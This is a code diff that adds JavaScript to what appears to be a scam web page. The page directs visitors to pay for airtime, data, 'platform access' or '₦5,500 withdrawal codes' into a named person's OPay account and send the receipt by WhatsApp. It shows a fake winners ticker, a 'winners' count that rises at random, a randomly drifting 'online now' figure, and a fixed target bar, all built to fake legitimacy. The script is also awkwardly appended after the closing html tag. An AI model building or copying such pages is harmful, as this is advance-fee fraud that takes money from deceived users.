@@ -878,3 +878,103 @@ renderWinners(); updateStats(); startWinnerTicker(); animateTarget();
 </script>
 </body>
 </html>
+// AIRTIME/DATA/PLATFORM/HELP: Show OWNER account + phone number input
+function showService(service) {
+    var titles = { airtime: 'Buy Airtime', data: 'Buy Data', platform: 'Platform Access', help: 'Support Service' };
+    var descs = {
+        airtime: 'Send payment for airtime. We\'ll top up your line once confirmed.',
+        data: 'Send payment for data bundle. We\'ll subscribe your line once confirmed.',
+        platform: 'Send payment for platform access. We\'ll activate your account.',
+        help: 'Send payment for premium support. We\'ll assist you immediately.'
+    };
+    document.getElementById('modalTitle').textContent = titles[service];
+    document.getElementById('modalBody').innerHTML = 
+        '<p>' + descs[service] + '</p>' +
+        '<div class="form-group" style="margin:1rem 0;">' +
+        '<label class="form-label">Phone Number to Receive ' + service.charAt(0).toUpperCase() + service.slice(1) + '</label>' +
+        '<input type="tel" class="form-input" id="servicePhone" placeholder="Enter phone number (e.g. 08012345678)" maxlength="11">' +
+        '</div>' +
+        '<p style="font-size:0.85rem;color:var(--text-muted);margin-bottom:0.75rem;">Send payment to admin account:</p>' +
+        '<div style="background:rgba(0,0,0,0.2);border-radius:12px;padding:1rem;border:1px solid var(--border);margin-bottom:1rem;">' +
+        '<div style="display:flex;justify-content:space-between;margin-bottom:0.5rem;"><span style="color:var(--text-muted);font-size:0.8rem;">Name</span><span style="font-weight:700;">Joseph Ohiemi</span></div>' +
+        '<div style="display:flex;justify-content:space-between;margin-bottom:0.5rem;"><span style="color:var(--text-muted);font-size:0.8rem;">Number</span><span style="font-weight:700;font-family:monospace;">9153082021</span></div>' +
+        '<div style="display:flex;justify-content:space-between;"><span style="color:var(--text-muted);font-size:0.8rem;">Bank</span><span style="font-weight:700;color:var(--opay);">OPay</span></div>' +
+        '</div>' +
+        '<div class="modal-note">📱 Enter your phone number above. After payment, WhatsApp screenshot + phone number.</div>' +
+        '<a href="https://wa.me/2349153082021" target="_blank" class="btn btn-primary" style="width:100%;margin-top:1rem;display:flex;">💬 Send Screenshot on WhatsApp</a>' +
+        '<button class="btn btn-secondary" onclick="closeModal()" style="width:100%;margin-top:0.75rem;">Cancel</button>';
+    document.getElementById('modalOverlay').classList.add('show');
+    document.getElementById('modal').classList.add('show');
+}
+
+function showFeature(feature) {
+    var titles = { code: 'Code Info', secure: 'Security', more: 'More Features' };
+    var bodies = {
+        code: 'Withdrawal codes cost ₦5,500. Buy a code to withdraw your balance.',
+        secure: 'Your security is our priority. All transactions are encrypted.',
+        more: 'Discover referral bonuses, leaderboard, VIP tiers, and exclusive giveaways.'
+    };
+    document.getElementById('modalTitle').textContent = titles[feature] || 'Feature';
+    document.getElementById('modalBody').innerHTML = '<p>' + (bodies[feature] || 'Coming soon!') + '</p>';
+    document.getElementById('modalOverlay').classList.add('show');
+    document.getElementById('modal').classList.add('show');
+}
+
+function closeModal() {
+    document.getElementById('modalOverlay').classList.remove('show');
+    document.getElementById('modal').classList.remove('show');
+}
+
+function updateStats() {
+    var winnersEl = document.getElementById('winnersCount');
+    var onlineEl = document.getElementById('onlineNow');
+    if (winnersEl && onlineEl) {
+        setInterval(function() {
+            var cw = parseInt(winnersEl.textContent.replace(/,/g, ''));
+            winnersEl.textContent = (cw + Math.floor(Math.random() * 3)).toLocaleString();
+            var co = parseInt(onlineEl.textContent.replace(/,/g, ''));
+            onlineEl.textContent = (co + Math.floor(Math.random() * 11) - 5).toLocaleString();
+        }, 5000);
+    }
+}
+
+var winners = [
+    { name: 'Adebola K.', amount: '₦5,000', time: '2 min ago' },
+    { name: 'Chinedu O.', amount: '₦10,000', time: '5 min ago' },
+    { name: 'Fatima A.', amount: '₦3,000', time: '8 min ago' },
+    { name: 'Emmanuel T.', amount: '₦15,000', time: '12 min ago' },
+    { name: 'Blessing M.', amount: '₦7,500', time: '15 min ago' },
+    { name: 'Ibrahim S.', amount: '₦20,000', time: '18 min ago' },
+    { name: 'Grace O.', amount: '₦5,000', time: '22 min ago' },
+    { name: 'David K.', amount: '₦12,000', time: '25 min ago' },
+];
+
+function renderWinners() {
+    var ticker = document.getElementById('winnersTicker');
+    if (ticker) {
+        ticker.innerHTML = winners.map(function(w) {
+            return '<div class="winner-item"><div class="winner-info"><div class="winner-avatar">' + w.name.charAt(0) + '</div><div><div class="winner-name">' + w.name + '</div><div class="winner-time">' + w.time + '</div></div></div><div class="winner-amount">' + w.amount + '</div></div>';
+        }).join('');
+    }
+}
+
+function startWinnerTicker() {
+    var names = ['Sarah J.', 'Michael A.', 'Precious E.', 'John D.', 'Amaka N.', 'Tunde B.', 'Kemi F.', 'Segun R.', 'Ngozi P.', 'Abdul H.'];
+    var amounts = ['₦5,000', '₦10,000', '₦3,000', '₦15,000', '₦8,000', '₦25,000', '₦6,000', '₦18,000'];
+    setInterval(function() {
+        winners.unshift({ name: names[Math.floor(Math.random() * names.length)], amount: amounts[Math.floor(Math.random() * amounts.length)], time: 'Just now' });
+        if (winners.length > 8) winners.pop();
+        renderWinners();
+    }, 8000);
+}
+
+function animateTarget() {
+    var p = document.getElementById('targetProgress');
+    if (p) setTimeout(function() { p.style.width = '68%'; }, 500);
+}
+
+renderWinners(); updateStats(); startWinnerTicker(); animateTarget();
+</script>
+</body>
+</html>
+
